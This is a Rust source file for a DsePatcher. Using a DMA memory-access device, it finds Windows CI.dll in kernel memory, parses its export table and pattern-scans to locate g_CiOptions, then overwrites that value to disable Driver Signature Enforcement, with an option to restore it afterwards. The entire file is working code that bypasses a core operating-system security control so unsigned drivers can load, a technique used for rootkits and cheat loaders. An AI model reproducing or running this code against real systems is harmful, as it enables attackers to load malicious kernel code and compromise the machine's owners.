use anyhow::{anyhow, Result};

use super::offsets::*;
use super::pattern::PatternScanner;
use crate::core::Dma;

pub struct DsePatcher<'a> {
    dma: &'a Dma<'a>,
    ci_base: u64,
    ci_size: u32,
    g_ci_options_va: Option<u64>,
    original_value: Option<u32>,
    build_number: u32,
}

impl<'a> DsePatcher<'a> {
    pub fn new(dma: &'a Dma<'a>) -> Result<Self> {
        let ci_module = dma.get_module(KERNEL_PID, CI_DLL_NAME)?;

        println!(
            "    Found {} at 0x{:X} (size: 0x{:X})",
            CI_DLL_NAME, ci_module.base, ci_module.size
        );

        let build_number = Self::get_build_number(dma)?;
        println!("    Windows build number: {}", build_number);

        Ok(Self {
            dma,
            ci_base: ci_module.base,
            ci_size: ci_module.size,
            g_ci_options_va: None,
            original_value: None,
            build_number,
        })
    }

    pub fn find_g_ci_options(&mut self) -> Result<u64> {
        if let Some(va) = self.g_ci_options_va {
            return Ok(va);
        }

        println!("    Reading CI.dll PE header...");
        let ci_data = self
            .dma
            .read(KERNEL_PID, self.ci_base, self.ci_size as usize)?;

        let ci_init_rva = self.find_export_rva(&ci_data, CI_INITIALIZE_EXPORT)?;
        println!("    CiInitialize RVA: 0x{:X}", ci_init_rva);

        let ci_init_va = self.ci_base + ci_init_rva as u64;
        let ci_init_offset = ci_init_rva as usize;

        let scanner = PatternScanner::new(&ci_data, self.ci_base);

        println!("    Scanning for CipInitialize...");
        let cip_init_va = if self.build_number < WIN10_1709_BUILD {
            scanner.find_cip_initialize_pre_1709(ci_init_offset)?
        } else if self.build_number < WIN11_24H2_BUILD {
            scanner.find_cip_initialize_post_1709(ci_init_offset)?
        } else {
            match scanner.find_cip_initialize_24h2(ci_init_offset) {
                Ok(va) => va,
                Err(_) => scanner.find_cip_initialize_post_1709(ci_init_offset)?,
            }
        };

        println!("    CipInitialize VA: 0x{:X}", cip_init_va);

        if cip_init_va < self.ci_base || cip_init_va >= self.ci_base + self.ci_size as u64 {
            return Err(anyhow!("CipInitialize address out of CI.dll bounds"));
        }

        let cip_init_offset = (cip_init_va - self.ci_base) as usize;

        println!("    Scanning for g_CiOptions...");
        let g_ci_options_va = scanner.find_g_ci_options(cip_init_offset)?;

        println!("    g_CiOptions VA: 0x{:X}", g_ci_options_va);

        self.g_ci_options_va = Some(g_ci_options_va);
        Ok(g_ci_options_va)
    }

    pub fn read_dse_state(&self) -> Result<u32> {
        let va = self
            .g_ci_options_va
            .ok_or_else(|| anyhow!("g_CiOptions not located yet"))?;

        self.dma.read_u32(KERNEL_PID, va)
    }

    pub fn disable_dse(&mut self) -> Result<()> {
        let va = match self.g_ci_options_va {
            Some(v) => v,
            None => self.find_g_ci_options()?,
        };

        let current = self.dma.read_u32(KERNEL_PID, va)?;
        println!("    Current g_CiOptions: 0x{:08X}", current);

        if self.original_value.is_none() {
            self.original_value = Some(current);
        }

        if current == DSE_DISABLED {
            println!("    DSE already disabled");
            return Ok(());
        }

        println!("    Patching g_CiOptions to 0x{:08X}...", DSE_DISABLED);
        self.dma
            .write(KERNEL_PID, va, &DSE_DISABLED.to_le_bytes())?;

        let verify = self.dma.read_u32(KERNEL_PID, va)?;
        if verify != DSE_DISABLED {
            return Err(anyhow!(
                "DSE patch verification failed: got 0x{:08X}",
                verify
            ));
        }

        println!("    DSE disabled successfully");
        Ok(())
    }

    pub fn enable_dse(&mut self) -> Result<()> {
        let va = self
            .g_ci_options_va
            .ok_or_else(|| anyhow!("g_CiOptions not located yet"))?;

        let restore_value = self.original_value.unwrap_or(DSE_ENABLED);

        println!("    Restoring g_CiOptions to 0x{:08X}...", restore_value);
        self.dma
            .write(KERNEL_PID, va, &restore_value.to_le_bytes())?;

        let verify = self.dma.read_u32(KERNEL_PID, va)?;
        if verify != restore_value {
            return Err(anyhow!(
                "DSE restore verification failed: got 0x{:08X}",
                verify
            ));
        }

        println!("    DSE restored successfully");
        Ok(())
    }

    pub fn get_status_string(&self) -> Result<String> {
        let value = self.read_dse_state()?;

        let status = match value {
            DSE_DISABLED => "DISABLED (0x00000000)",
            DSE_ENABLED => "ENABLED (0x00000006)",
            DSE_TEST_MODE => "TEST MODE (0x00000008)",
            _ => return Ok(format!("UNKNOWN (0x{:08X})", value)),
        };

        Ok(status.to_string())
    }

    pub fn g_ci_options_address(&self) -> Option<u64> {
        self.g_ci_options_va
    }

    fn find_export_rva(&self, pe_data: &[u8], export_name: &str) -> Result<u32> {
        if pe_data.len() < 64 {
            return Err(anyhow!("PE data too small"));
        }

        let dos_sig = u16::from_le_bytes([pe_data[0], pe_data[1]]);
        if dos_sig != IMAGE_DOS_SIGNATURE {
            return Err(anyhow!("Invalid DOS signature"));
        }

        let e_lfanew =
            u32::from_le_bytes([pe_data[0x3C], pe_data[0x3D], pe_data[0x3E], pe_data[0x3F]])
                as usize;

        if e_lfanew + 0x18 > pe_data.len() {
            return Err(anyhow!("Invalid PE header offset"));
        }

        let nt_sig = u32::from_le_bytes([
            pe_data[e_lfanew],
            pe_data[e_lfanew + 1],
            pe_data[e_lfanew + 2],
            pe_data[e_lfanew + 3],
        ]);

        if nt_sig != IMAGE_NT_SIGNATURE {
            return Err(anyhow!("Invalid NT signature"));
        }

        let optional_header_offset = e_lfanew + 0x18;
        let magic = u16::from_le_bytes([
            pe_data[optional_header_offset],
            pe_data[optional_header_offset + 1],
        ]);

        let export_dir_offset = if magic == 0x20B {
            optional_header_offset + 0x70
        } else {
            optional_header_offset + 0x60
        };

        if export_dir_offset + 8 > pe_data.len() {
            return Err(anyhow!("Export directory offset out of bounds"));
        }

        let export_rva = u32::from_le_bytes([
            pe_data[export_dir_offset],
            pe_data[export_dir_offset + 1],
            pe_data[export_dir_offset + 2],
            pe_data[export_dir_offset + 3],
        ]) as usize;

        let export_size = u32::from_le_bytes([
            pe_data[export_dir_offset + 4],
            pe_data[export_dir_offset + 5],
            pe_data[export_dir_offset + 6],
            pe_data[export_dir_offset + 7],
        ]) as usize;

        if export_rva == 0 || export_size == 0 {
            return Err(anyhow!("No export directory"));
        }

        if export_rva + 0x28 > pe_data.len() {
            return Err(anyhow!("Export directory out of bounds"));
        }

        let num_names = u32::from_le_bytes([
            pe_data[export_rva + 0x18],
            pe_data[export_rva + 0x19],
            pe_data[export_rva + 0x1A],
            pe_data[export_rva + 0x1B],
        ]) as usize;

        let addr_table_rva = u32::from_le_bytes([
            pe_data[export_rva + 0x1C],
            pe_data[export_rva + 0x1D],
            pe_data[export_rva + 0x1E],
            pe_data[export_rva + 0x1F],
        ]) as usize;

        let name_ptr_table_rva = u32::from_le_bytes([
            pe_data[export_rva + 0x20],
            pe_data[export_rva + 0x21],
            pe_data[export_rva + 0x22],
            pe_data[export_rva + 0x23],
        ]) as usize;

        let ordinal_table_rva = u32::from_le_bytes([
            pe_data[export_rva + 0x24],
            pe_data[export_rva + 0x25],
            pe_data[export_rva + 0x26],
            pe_data[export_rva + 0x27],
        ]) as usize;

        for i in 0..num_names {
            let name_rva_offset = name_ptr_table_rva + (i * 4);
            if name_rva_offset + 4 > pe_data.len() {
                continue;
            }

            let name_rva = u32::from_le_bytes([
                pe_data[name_rva_offset],
                pe_data[name_rva_offset + 1],
                pe_data[name_rva_offset + 2],
                pe_data[name_rva_offset + 3],
            ]) as usize;

            if name_rva >= pe_data.len() {
                continue;
            }

            let mut name_end = name_rva;
            while name_end < pe_data.len() && pe_data[name_end] != 0 {
                name_end += 1;
            }

            let name = std::str::from_utf8(&pe_data[name_rva..name_end]).unwrap_or("");

            if name == export_name {
                let ordinal_offset = ordinal_table_rva + (i * 2);
                if ordinal_offset + 2 > pe_data.len() {
                    return Err(anyhow!("Ordinal table out of bounds"));
                }

                let ordinal =
                    u16::from_le_bytes([pe_data[ordinal_offset], pe_data[ordinal_offset + 1]])
                        as usize;

                let func_rva_offset = addr_table_rva + (ordinal * 4);
                if func_rva_offset + 4 > pe_data.len() {
                    return Err(anyhow!("Function address table out of bounds"));
                }

                let func_rva = u32::from_le_bytes([
                    pe_data[func_rva_offset],
                    pe_data[func_rva_offset + 1],
                    pe_data[func_rva_offset + 2],
                    pe_data[func_rva_offset + 3],
                ]);

                return Ok(func_rva);
            }
        }

        Err(anyhow!("Export '{}' not found", export_name))
    }

    fn get_build_number(dma: &Dma) -> Result<u32> {
        let vmm = dma.vmm();

        if let Ok(info) = vmm.get_config(memprocfs::CONFIG_OPT_WIN_VERSION_BUILD) {
            if info > 0 {
                println!("    Detected Windows Build {} (from VMM)", info);
                return Ok(info as u32);
            }
        }

        let ntoskrnl = dma.get_module(KERNEL_PID, "ntoskrnl.exe")?;
        let header = dma.read(KERNEL_PID, ntoskrnl.base, 0x200)?;

        if header.len() < 0x200 {
            return Ok(WIN10_1709_BUILD);
        }

        let e_lfanew =
            u32::from_le_bytes([header[0x3C], header[0x3D], header[0x3E], header[0x3F]]) as usize;

        if e_lfanew + 0x50 > header.len() {
            return Ok(WIN10_1709_BUILD);
        }

        let optional_header = e_lfanew + 0x18;
        let magic = u16::from_le_bytes([header[optional_header], header[optional_header + 1]]);

        let (major_off, minor_off) = if magic == 0x20B {
            (optional_header + 0x40, optional_header + 0x42)
        } else {
            (optional_header + 0x40, optional_header + 0x42)
        };

        if major_off + 2 > header.len() || minor_off + 2 > header.len() {
            return Ok(WIN10_1709_BUILD);
        }

        let os_major = u16::from_le_bytes([header[major_off], header[major_off + 1]]);
        let os_minor = u16::from_le_bytes([header[minor_off], header[minor_off + 1]]);

        let build = match (os_major, os_minor) {
            (10, 0) => {
                let linker_major = header[e_lfanew + 0x1A];
                let linker_minor = header[e_lfanew + 0x1B];

                match (linker_major, linker_minor) {
                    (14, 40..) => 26100,
                    (14, 36..) => 22621,
                    (14, 30..) => 19041,
                    (14, 20..) => 17763,
                    (14, 16..) => 17134,
                    (14, 14..) => 16299,
                    (14, 10..) => 15063,
                    (14, _) => 14393,
                    _ => 19041,
                }
            }
            (6, 3) => 9600,
            (6, 2) => 9200,
            (6, 1) => 7601,
            _ => WIN10_1709_BUILD,
        };

        println!(
            "    Detected Windows {}.{} (estimated build {})",
            os_major, os_minor, build
        );

        Ok(build)
    }
}

impl<'a> Drop for DsePatcher<'a> {
    fn drop(&mut self) {
        if self.original_value.is_some() && self.g_ci_options_va.is_some() {
            println!("[!] DsePatcher dropped - DSE may still be disabled!");
            println!("    Call enable_dse() before dropping to restore DSE");
        }
    }
}
